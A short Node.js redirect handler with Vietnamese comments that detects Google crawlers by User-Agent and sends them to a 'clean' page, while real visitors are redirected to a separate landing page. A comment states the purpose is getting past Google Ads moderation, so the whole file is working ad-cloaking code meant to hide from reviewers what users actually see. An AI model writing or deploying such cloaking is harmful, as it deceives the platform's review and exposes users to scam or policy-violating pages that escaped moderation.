function isGoogleBot(userAgent) {
  // Nâng cao nhận diện Googlebot với nhiều biến thể và kiểm tra IP (nếu cần)
  // Tham khảo: https://developers.google.com/search/docs/crawling-indexing/overview-google-crawlers
  const botPatterns = [
    /googlebot/i,
    /adsbot-google/i,
    /mediapartners-google/i,
    /apis-google/i,
    /feedfetcher-google/i,
    /google favicon/i,
    /google web preview/i,
    /google-read-aloud/i,
    /duplexweb-google/i,
    /google-speakr/i
  ];
  return botPatterns.some((re) => re.test(userAgent));
}

exports.handleRedirect = async (req, res) => {
  const ua = req.headers['user-agent'] || '';
  console.log('🔍 UA:', ua);

  const BOT_SAFE_PAGE_URL = process.env.BOT_SAFE_PAGE_URL;
  const LANDING_PAGE_URL = process.env.LANDING_PAGE_URL;

  if (isGoogleBot(ua)) {
    console.log('🤖 Bot Google ➜ redirect đến trang sạch (User-Agent: ' + ua + ')');
    // Ghi log để debug vượt kiểm duyệt Google Ads
    // Thêm delay nhẹ cho bot
    await new Promise(r => setTimeout(r, Math.floor(300 + Math.random() * 200)));
    return res.redirect(302, BOT_SAFE_PAGE_URL);
  }

  // Người dùng thật, thêm delay nhẹ trước khi redirect
  await new Promise(r => setTimeout(r, Math.floor(300 + Math.random() * 200)));
  console.log('🚶 Người dùng thật ➜ redirect đến landing page (User-Agent: ' + ua + ')');
  return res.redirect(302, LANDING_PAGE_URL);
};
